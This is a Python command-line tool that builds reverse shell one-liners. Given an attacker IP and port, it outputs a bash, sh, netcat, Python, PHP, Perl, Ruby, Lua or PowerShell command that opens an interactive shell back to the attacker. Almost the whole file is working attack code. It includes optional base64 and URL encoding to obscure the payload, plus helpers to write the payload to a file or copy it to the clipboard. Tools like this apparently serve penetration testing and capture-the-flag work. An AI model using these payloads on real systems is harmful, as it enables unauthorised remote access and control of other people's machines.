import argparse
from argparse import Action
import urllib.parse
import sys
import base64
import subprocess
import re
import socket


class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=40)


def url_encode(payload):
    return urllib.parse.quote_plus(payload)


def encode_base64(payload):
    encoded_payload = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded_payload} | base64 -d | bash"


def encode_powershell_payload(payload):
    utf16le_payload = payload.encode("utf-16le")
    base64_payload = base64.b64encode(utf16le_payload).decode("utf-8")
    return base64_payload


def get_tun0_ip(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface]).decode()
        match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", output)
        if match:
            ip_address = match.group(1)
            return ip_address.strip()
        else:
            print(
                f"Error: Could not find IP address for interface '{interface}'. Please enter a valid IP address."
            )
            sys.exit(1)
    except subprocess.CalledProcessError:
        print(
            f"Error: Interface '{interface}' does not exist. Please enter a valid IP address."
        )
        sys.exit(1)
    except Exception as e:
        print(f"Error: Could not get IP address for interface '{interface}': {e}")
        sys.exit(1)


def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def generate_reverse_shell_payload(shell_type, ip, port, encode, base64_encode):
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "sh": f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
        "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'',
        "php": f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "perl": f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        "ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        "nc": f"nc -e /bin/sh {ip} {port}",
        "lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('bash -i <&3 >&3 2>&3');\"",
        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    }

    payload = payloads.get(shell_type)

    if payload is None:
        print("Unsupported shell type")
        return None

    if shell_type == "powershell":
        encoded_payload = encode_powershell_payload(payload)
        payload = f"powershell -ec {encoded_payload}"

    else:
        if encode:
            payload = url_encode(payload)

        if base64_encode:
            payload = encode_base64(payload)

    return payload


def main():
    parser = argparse.ArgumentParser(
        description="Generate reverse shell payload",
        formatter_class=CustomHelpFormatter,
    )
    parser.add_argument(
        "shell_type", help="Type of the shell (bash, python, php, nc, powershell, ...)"
    )
    parser.add_argument("ip", help="IP address of the attacker")
    parser.add_argument("port", type=int, help="Port to listen on")
    parser.add_argument(
        "-e", "--encode", action="store_true", help="URL encode the payload"
    )
    parser.add_argument(
        "-b", "--base64", action="store_true", help="Base64 encode the payload"
    )
    parser.add_argument(
        "-w", "--write", metavar="FILENAME", help="Write the payload to a file"
    )
    parser.add_argument(
        "-c", "--copy", action="store_true", help="Copy the payload to clipboard"
    )
    args = parser.parse_args()

    if is_valid_ip(args.ip):
        ip = args.ip
    else:
        ip = get_tun0_ip(args.ip)

    payload = generate_reverse_shell_payload(
        args.shell_type, ip, args.port, args.encode, args.base64
    )

    if payload is None:
        return

    print(f"[+] Payload: {payload}")

    if hasattr(args, "write") and args.write:
        try:
            with open(args.write, "w") as f:
                if args.shell_type == "bash":
                    f.write("#!/bin/bash\n")
                f.write(payload)
            print(f"[+] Payload written to {args.write}")
        except Exception as e:
            print(f"Error: Could not write file to {e}")

    if args.copy:
        try:
            import pyperclip

            pyperclip.copy(payload)
            print("[+] Payload copied to clipbaord")
        except ImportError:
            print(
                "[-] Please install the 'pyperclip' module to copy the payload to the clipboard."
            )
            print("[-] You can install it using pip: pip3 install pyperclip.")


if __name__ == "__main__":
    main()
